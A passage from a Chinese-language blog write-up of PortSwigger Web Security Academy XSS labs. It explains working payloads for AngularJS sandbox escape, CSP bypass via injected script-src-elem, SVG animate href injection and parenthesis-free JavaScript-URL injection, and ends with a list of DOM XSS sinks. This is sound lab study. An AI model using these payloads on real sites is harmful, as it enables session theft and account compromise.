<li>传入<code>$scope.query</code>作为上下文，执行解析后的表达式，相当于 <code>$scope.query.search</code>；</li>
<li>因此，<code>$scope.value</code>最终被赋值为<code>&#39;she11f&#39;</code>。</li>
</ul>
<p><code>parse(expressionString)</code> 的本质就是：<strong>将字符串形式的 Angular 表达式，编译成一个可在指定上下文对象中执行的函数</strong>。所以我们利用 key 值来进行注入，$parse(key) 就类似于 ,那该怎么控制 key 呢？直接把 search 换掉显然不太行，我们再加一个参数试一试</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?search=she11f&amp;1=1</span><br></pre></td></tr></table></figure>

<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://pic-bed-1321641074.cos.ap-guangzhou.myqcloud.com/blog/202509280022032.png" alt="image-20250928002243865"></p>
<p>程序员居然迭代了 key，那我们就能控制 key 的值了。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?search=she11f&amp;1%2b1=1</span><br></pre></td></tr></table></figure>

<p>成功解析了，但是 angularjs 沙盒给字符串和 alert 豆 ban 了。去速查表直接查</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">toString().constructor.prototype.charAt=[].join; [1,2]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)</span><br></pre></td></tr></table></figure>

<p>记得 url 编码一遍再发。原理的话看 ai 吧（哎）</p>
<h3 id="Lab-Reflected-XSS-with-AngularJS-sandbox-escape-and-CSP"><a href="#Lab-Reflected-XSS-with-AngularJS-sandbox-escape-and-CSP" class="headerlink" title="Lab: Reflected XSS with AngularJS sandbox escape and CSP"></a>Lab: Reflected XSS with AngularJS sandbox escape and CSP</h3><blockquote>
<p>​            This lab uses CSP and AngularJS.        </p>
<p>​            To solve the lab, perform a cross-site scripting attack that bypasses CSP, escapes the AngularJS sandbox, and alerts <code>document.cookie</code>.        </p>
</blockquote>
<p>原理：</p>
<p><a target="_blank" rel="noopener" href="https://portswigger.net/research/angularjs-csp-bypass-in-56-characters">https://portswigger.net/research/angularjs-csp-bypass-in-56-characters</a></p>
<p>payload</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-handlebars"><span class="language-xml"></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">location=&quot;https://0a57006c0472b13d804803f500c90045.web-security-academy.net/?search=<span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">x</span> <span class="attr">ng-focus</span>=<span class="string">$event.composedPath()|orderBy:</span>&#x27;(<span class="attr">y</span>=<span class="string">alert)(document.cookie)</span>&#x27;&gt;</span>#x&quot;</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"></span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>这里不用 <strong>autofocus</strong> 而用<strong>锚点</strong>来触发 <strong>ng-focus</strong> 是因为前者会超出字符限制。</p>
<h3 id="Lab-Reflected-XSS-with-event-handlers-and-href-attributes-blocked"><a href="#Lab-Reflected-XSS-with-event-handlers-and-href-attributes-blocked" class="headerlink" title="Lab: Reflected XSS with event handlers and href attributes blocked"></a>Lab: Reflected XSS with event handlers and <code>href</code> attributes blocked</h3><blockquote>
<pre><code>         This lab contains a reflected XSS vulnerability with some whitelisted tags, but all events and anchor `href` attributes are blocked. 	
</code></pre>
<p>​			To solve the lab, perform a cross-site scripting attack that injects a vector that, when clicked, calls the <code>alert</code> function. 	</p>
<p>​			Note that you need to label your vector with the word “Click” in  order to induce the simulated lab user to click your vector. For  example:        </p>
<p><a href="">Click me</a></p>
</blockquote>
<p>爆破一下可用的标签，有 svg，a 和 animate ，但是所有事件以及 <strong>href:</strong> 貌似是被过滤了。</p>
<p>我们看一下 <strong>svg</strong> 和 <strong>animate</strong> 怎么用的吧，官网给了个例子</p>
<figure class="highlight svg"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">viewBox</span>=<span class="string">&quot;0 0 10 10&quot;</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.w3.org/2000/svg&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">rect</span> <span class="attr">width</span>=<span class="string">&quot;10&quot;</span> <span class="attr">height</span>=<span class="string">&quot;10&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">animate</span></span></span><br><span class="line"><span class="tag">      <span class="attr">attributeName</span>=<span class="string">&quot;rx&quot;</span></span></span><br><span class="line"><span class="tag">      <span class="attr">values</span>=<span class="string">&quot;0;5;0&quot;</span></span></span><br><span class="line"><span class="tag">      <span class="attr">dur</span>=<span class="string">&quot;10s&quot;</span></span></span><br><span class="line"><span class="tag">      <span class="attr">repeatCount</span>=<span class="string">&quot;indefinite&quot;</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">rect</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>看不懂，丢给ai解释一下</p>
<ol>
<li><p><strong>目标元素</strong>：<code>&lt;rect&gt;</code>（矩形）</p>
</li>
<li><p><strong>动画属性</strong>：<code>rx</code>（矩形的圆角半径）</p>
</li>
<li><p><strong>动画效果</strong>：</p>
<ul>
<li><code>values=&quot;0;5;0&quot;</code>：圆角半径从 0 → 5 → 0 循环变化</li>
<li><code>dur=&quot;10s&quot;</code>：完成一次循环需要10秒</li>
<li><code>repeatCount=&quot;indefinite&quot;</code>：无限循环</li>
</ul>
</li>
<li><p><strong>视觉效果</strong>：矩形会在方形（直角）和圆角矩形之间平滑过渡，创建一个脉动的圆角效果。</p>
</li>
</ol>
<p>也就是说 <strong>animate</strong> 里的  <strong>attributeName</strong> 和 <strong>values</strong> 元素，一起使用可以控制 <strong>rect</strong> 的 属性值，假如我们把 <strong>rect</strong> 换成 <strong>a</strong>，</p>
<p><code>attributeName=&quot;rx&quot;</code> 换成 <code>attributeName=&quot;href&quot;</code> , <code>values=&quot;0;5;0&quot;</code> 换成 <code>values=&quot;javascript:alert(1)&quot;</code> 试试</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">a</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">animate</span> <span class="attr">attributeName</span>=<span class="string">&quot;href&quot;</span> <span class="attr">values</span>=<span class="string">&quot;javascript:alert(1)&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>可是点不到，加字也加载不出来，看下文档，原来 &lt;svg&gt; 内部要有字得用标签 &lt;text&gt;</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">a</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">animate</span> <span class="attr">attributeName</span>=<span class="string">&quot;href&quot;</span> <span class="attr">values</span>=<span class="string">&quot;javascript:alert(1)&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">text</span> <span class="attr">x</span>=<span class="string">&quot;100&quot;</span> <span class="attr">y</span>=<span class="string">&quot;100&quot;</span>&gt;</span>Click me<span class="tag">&lt;/<span class="name">text</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>x,y是声明文字坐标，这个不加的话也看不到字体</p>
<h3 id="Lab-Reflected-XSS-in-a-JavaScript-URL-with-some-characters-blocked"><a href="#Lab-Reflected-XSS-in-a-JavaScript-URL-with-some-characters-blocked" class="headerlink" title="Lab: Reflected XSS in a JavaScript URL with some characters blocked"></a>Lab: Reflected XSS in a JavaScript URL with some characters blocked</h3><blockquote>
<p>​            This lab reflects your input in a JavaScript URL, but all is not as it seems. This initially seems like a trivial challenge;  however, the application is blocking some characters in an attempt to  prevent XSS attacks.        </p>
<p>​            To solve the lab, perform a cross-site scripting attack that calls the <code>alert</code> function with the string <code>1337</code> contained somewhere in the <code>alert</code> message.        </p>
</blockquote>
<p>进来发现一个可控点，可以进入 javascript 上下文环境</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:fetch(&#x27;/analytics&#x27;, &#123;method:&#x27;post&#x27;,body:&#x27;/post%3fpostId%3d1&#x27;&#125;).finally(_ =<span class="symbol">&amp;gt;</span> window.location = &#x27;/&#x27;)&quot;</span>&gt;</span>Back to Blog<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>其中 body 字段值来自于 url ，我们可控，直接看 <strong>payload</strong></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">https</span>:<span class="comment">//YOUR-LAB-ID.web-security-academy.net/post?postId=5&amp;&#x27;&#125;,x=x=&gt;&#123;throw/**/onerror=alert,1337&#125;,toString=x,window+&#x27;&#x27;,&#123;x:&#x27;</span></span><br></pre></td></tr></table></figure>

<p>再看一下 html</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:fetch(&#x27;/analytics&#x27;, &#123;method:&#x27;post&#x27;,body:&#x27;/post%3fpostId%3d5%26%27&#125;,x%3dx%3d%3e&#123;throw/**/onerror%3dalert,1337&#125;,toString%3dx,window+%27%27,&#123;x%3a%27&#x27;&#125;).finally(_ =<span class="symbol">&amp;gt;</span> window.location = &#x27;/&#x27;)&quot;</span>&gt;</span>Back to Blog<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>url 解码看一下</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:fetch(&#x27;/analytics&#x27;, &#123;method:&#x27;post&#x27;,body:&#x27;/post?postId=5&amp;&#x27;&#125;,x=x=&gt;&#123;throw/**/onerror=alert,1337&#125;,toString=x,window+&#x27;&#x27;,&#123;x:&#x27;&#x27;&#125;).finally(_ =<span class="symbol">&amp;gt;</span> window.location = &#x27;/&#x27;)&quot;</span>&gt;</span>Back to Blog<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>结合 payload ，<code>5&amp;&#39;&#125;</code> 很容易理解，闭合 fetch 的第二个参数，<code>x=x=&gt;&#123;throw/**/onerror=alert,1337&#125;</code> 变成了 fetch 的第三个参数，</p>
<p><code>toString=x</code>,<code>window+&#39;&#39;</code> 是第四，五个参数，<code>&#123;x:&#39;</code> 用来闭合第六个参数。</p>
<h5 id="参数三"><a href="#参数三" class="headerlink" title="参数三"></a>参数三</h5><p>这题背景是括号和空格被过滤了，先看片文章来理解 fetch 第三个参数，<a target="_blank" rel="noopener" href="https://portswigger.net/research/xss-without-parentheses-and-semi-colons">https://portswigger.net/research/xss-without-parentheses-and-semi-colons</a></p>
<p>文章给出了一个 payload,确实没用到空格</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="keyword">throw</span> onerror=alert,<span class="string">&#x27;some string&#x27;</span>,<span class="number">123</span>,<span class="string">&#x27;haha&#x27;</span>&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>throw 就是抛出一个异常，比如</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">throw 123;</span><br></pre></td></tr></table></figure>

<p>F12 可以看到控制台报错</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Uncaught 123</span><br></pre></td></tr></table></figure>

<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">throw</span> <span class="number">123</span>,<span class="number">456</span>;</span><br><span class="line"><span class="comment">//控制台报错 =&gt; Uncaught 456</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> myvar = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">throw</span> myvar+=<span class="number">1</span>,myvar;</span><br><span class="line"><span class="comment">//控制台报错 =&gt; Uncaught 2</span></span><br></pre></td></tr></table></figure>

<p>所以 throw 永远是抛出最后一个逗号后的数据（逗号操作符会返回最后一个表达式的值），而且可以执行 js 代码。</p>
<p><code>onerror=alert</code>，将<code>alert</code>函数赋值给<code>onerror</code>,当throw执行时，会触发错误，由于<code>onerror</code>已经被设置为<code>alert</code>函数，所以会调用<code>alert(&#39;haha&#39;)</code>。</p>
<p>继续看 <code>x=x=&gt;&#123;throw/**/onerror=alert,1337&#125;</code>,多行注释符号很明显是绕过空格过滤，这是一个箭头函数的写法，两个 x代表的意义和作用域不一样，一个是函数名，一个是传入函数的参数，我们可以写成</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">x = <span class="function">(<span class="params">x</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">throw</span> onerror=alert,<span class="number">1337</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>但是还是得函数调用才能执行代码</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">x = <span class="function">(<span class="params">x</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">throw</span> onerror=alert,<span class="number">1337</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">x</span>();</span><br></pre></td></tr></table></figure>

<h5 id="参数四，参数五"><a href="#参数四，参数五" class="headerlink" title="参数四，参数五"></a>参数四，参数五</h5><p><code>,toString=x,window+&#39;&#39;,</code>,这里就很明显了，把前面定义的 x 函数给全局 <strong>toString</strong>，将window对象与空字符串相加这会触发<strong>隐式类型转换</strong>，调用<code>window.toString()</code>方法，但是 toString 已经被 x 函数覆盖了，于是就调用了 x 函数里的代码发生弹窗。</p>
<h5 id="参数六"><a href="#参数六" class="headerlink" title="参数六"></a>参数六</h5><p><code>&#123;x:&#39;</code> 闭合 <code>&#39;&#125;</code></p>
<p>挺复杂的，还有一个问题就是为什么不直接 <code>throw onerror=alert,1337</code>,而是要再定义一个函数来调用，还得本地实验一下</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">fetch</span>(<span class="string">&quot;http://47.xx.xx.xx/&quot;</span>,&#123;</span><br><span class="line">  <span class="attr">method</span>:<span class="string">&#x27;post&#x27;</span>,</span><br><span class="line">  <span class="attr">body</span>:<span class="string">&#x27;a=1&#x27;</span></span><br><span class="line">&#125;,<span class="keyword">throw</span> onerror=alert,<span class="number">1337</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p>其实已经爆红，看看控制台给的错误</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Uncaught SyntaxError: Unexpected token &#x27;throw&#x27; (at index.html:9:5)</span><br></pre></td></tr></table></figure>

<p>函数参数在传递前<strong>必须被计算成具体的值</strong>。，这是语句没有产生值，不能作为函数参数，但是 <code>x=x=&gt;&#123;throw/**/onerror=alert,1337&#125;</code>是表达式，即使看起来没有返回值的表达式，在语言层面也会产生一个值，可以作为参数。</p>
<p>为什么 <strong>fetch</strong> 可以加那么多参数呢，其实也是 <strong>js</strong> 特性。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">  <span class="keyword">const</span> sum = <span class="keyword">function</span>(<span class="params">a,b</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> a+b;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">sum</span>(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,c=<span class="number">1</span>+<span class="number">1</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">// 3</span></span><br></pre></td></tr></table></figure>



<h3 id="Lab-Reflected-XSS-protected-by-very-strict-CSP-with-dangling-markup-attack"><a href="#Lab-Reflected-XSS-protected-by-very-strict-CSP-with-dangling-markup-attack" class="headerlink" title="Lab: Reflected XSS protected by very strict CSP, with dangling markup attack"></a>Lab: Reflected XSS protected by very strict CSP, with dangling markup attack</h3><blockquote>
<p>​            This lab using a strict CSP that blocks outgoing requests to external web sites.        </p>
<p>​            To solve the lab, first perform a cross-site scripting  attack that bypasses the CSP and exfiltrates a simulated victim user’s  CSRF token using Burp Collaborator. You then need to change the  simulated user’s email address to <code>hacker@evil-user.net</code>. 	</p>
<p>​			You must label your vector with the word “Click” in order to induce the simulated user to click it. For example: 	</p>
<p><a href="">Click me</a></p>
<p>​			You can log in to your own account using the following credentials: <code>wiener:peter</code> 	</p>
</blockquote>
<p>被这道题的官方解法搞蒙了，直到看到这篇文章 <a target="_blank" rel="noopener" href="https://medium.com/@hackllego/reflected-xss-protected-by-very-strict-csp-with-dangling-markup-attack-port-swigger-xss-lab-e8811c2e476d">https://medium.com/@hackllego/reflected-xss-protected-by-very-strict-csp-with-dangling-markup-attack-port-swigger-xss-lab-e8811c2e476d</a> 比官方 WP 过程简单许多。</p>
<h3 id="Lab-Reflected-XSS-protected-by-CSP-with-CSP-bypass"><a href="#Lab-Reflected-XSS-protected-by-CSP-with-CSP-bypass" class="headerlink" title="Lab: Reflected XSS protected by CSP, with CSP bypass"></a>Lab: Reflected XSS protected by CSP, with CSP bypass</h3><blockquote>
<p>​            This lab uses CSP and contains a reflected XSS vulnerability.        </p>
<p>​            To solve the lab, perform a cross-site scripting attack that bypasses the CSP and calls the <code>alert</code> function.        </p>
<p>Please note that the intended solution to this lab is only possible in Chrome.</p>
</blockquote>
<p>注入</p>
<blockquote>
<p>&lt;s&gt;123</p>
</blockquote>
<p>成功解析了</p>
<blockquote>
<p>&lt;img src&#x3D;1 onerror&#x3D;alert(1)&gt;</p>
</blockquote>
<p>控制台报错，<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://pic-bed-1321641074.cos.ap-guangzhou.myqcloud.com/blog/202510042021986.png" alt="image-20251004202108839"></p>
<p>有 csp 策略，看下返回包的Headers</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">content-security-policy</span><span class="punctuation">: </span>default-src &#x27;self&#x27;; object-src &#x27;none&#x27;;script-src &#x27;self&#x27;; style-src &#x27;self&#x27;; report-uri /csp-report?token=</span><br></pre></td></tr></table></figure>

<p>看到 <strong>report-uri</strong>  指令，会<strong>把用户输入的内容直接拼接到CSP策略里</strong>，但是CSP规定：<strong>同一个指令出现多次时，后面的不会覆盖前面的</strong>。</p>
<blockquote>
<p>Chrome引入了 <strong><code>script-src-elem</code></strong> 指令，它<strong>只控制<code>&lt;script&gt;</code>标签</strong>，不控制事件处理器。</p>
<p><strong>最重要的是：这个新指令可以覆盖现有的script-src规则！</strong></p>
</blockquote>
<p>所以用 ; 结束前一个指令</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">token=; script-src-elem &#x27;unsafe-inline&#x27;</span><br></pre></td></tr></table></figure>

<p>因为**<code>script-src-elem</code>** 指令只能覆盖 script 上下文不控制事件处理器。，所以 onerror 事件肯定还是没法用了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?search=&lt;script&gt;alert(1)&lt;/script&gt;&amp;token=; script-src-elem &#x27;unsafe-inline&#x27;</span><br><span class="line">?search=&lt;iframe src=&quot;javascript:alert(1)&quot;&gt;&amp;token=; script-src-elem &#x27;unsafe-inline&#x27;</span><br></pre></td></tr></table></figure>







<h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h2><p>可能导致 DOM 型 XSS 的 sinks</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">document.write()</span><br><span class="line">document.writeln()</span><br><span class="line">document.domain</span><br><span class="line">element.innerHTML</span><br><span class="line">element.outerHTML</span><br><span class="line">element.insertAdjacentHTML</span><br><span class="line">element.onevent</span><br><span class="line"></span><br><span class="line">jquery 内置</span><br><span class="line">add()</span><br><span class="line">after()</span><br><span class="line">append()</span><br><span class="line">animate()</span><br><span class="line">insertAfter()</span><br><span class="line">insertBefore()</span><br><span class="line">before()</span><br><span class="line">html()</span><br><span class="line">prepend()</span><br><span class="line">replaceAll()</span><br><span class="line">replaceWith()</span><br><span class="line">wrap()</span><br><span class="line">wrapInner()</span><br><span class="line">wrapAll()</span><br><span class="line">has()</span><br><span class="line">constructor()</span><br><span class="line">init()</span><br><span class="line">index()</span><br><span class="line">jQuery.parseHTML()</span><br><span class="line">$.parseHTML()</span><br></pre></td></tr></table></figure>




<div class="article-footer fs14">
    <section id="license">
      <div class="header"><span>许可协议</span></div>
      <div class="body"><p>本文采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">署名-非商业性使用-相同方式共享 4.0 国际</a> 许可协议，转载请注明出处。</p>
</div>
    </section>
    
    <section id="share">
      <div class="header"><span>分享文章</span></div>
      <div class="body">
        <div class="link"><input class="copy-area" readonly="true" id="copy-link" value="http://example.com/2025/09/08/%E9%9D%B6%E5%9C%BA/PortSwigger/XSS/" /></div>
        <div class="social-wrap dis-select"><a class="social share-item wechat" onclick="util.toggle(&quot;qrcode-wechat&quot;)"><img class="lazy"  src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/social/b32ef3da1162a.svg" /></a><a class="social share-item weibo" target="_blank" rel="external nofollow noopener noreferrer" href="https://service.weibo.com/share/share.php?url=http://example.com/2025/09/08/%E9%9D%B6%E5%9C%BA/PortSwigger/XSS/&title=PortSwigger XSS - sleeper&summary=Cross-site scriptingLab: Reflected XSS into HTML context with nothing encoded
This lab contains a simple reflected cr..."><img class="lazy"  src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/social/80c07e4dbb303.svg" /></a><a class="social share-item email" href="mailto:?subject=PortSwigger XSS - sleeper&amp;body=http://example.com/2025/09/08/%E9%9D%B6%E5%9C%BA/PortSwigger/XSS/"><img class="lazy"  src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/social/a1b00e20f425d.svg" /></a><a class="social share-item link" onclick="util.copy(&quot;copy-link&quot;, &quot;复制成功&quot;)"><img class="lazy"  src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/social/8411ed322ced6.svg" /></a></div>
        
        <div class="qrcode" id="qrcode-wechat" style="opacity:0;height:0">
          <img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://api.qrserver.com/v1/create-qr-code/?size=256x256&data=http://example.com/2025/09/08/%E9%9D%B6%E5%9C%BA/PortSwigger/XSS/"/>
        </div>
        
      </div>
    </section>
    </div>
</article>
<div class="related-wrap" id="read-next"><section class="body"><div class="item" id="prev"><div class="note">较新文章</div><a href="/2025/10/05/%E9%9D%B6%E5%9C%BA/PortSwigger/SQL%20INJECTION/">PortSwigger SQL INJECTION</a></div><div class="item" id="next"><div class="note">较早文章</div><a href="/2025/05/10/%E9%9D%B6%E5%9C%BA/%E7%8E%84%E6%9C%BA/1/">第一章 应急响应-webshell查杀</a></div></section></div>






<footer class="page-footer footnote"><hr><div class="text"><p>本站由 <a href="/">she11f</a> 使用 <a target="_blank" rel="noopener" href="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.29.1">Stellar 1.29.1</a> 主题创建。<br>本博客所有文章除特别声明外，均采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议，转载请注明出处。</p>
</div></footer>
<div class="main-mask" onclick="sidebar.dismiss()"></div></div><aside class="l_right">
<div class="widgets">



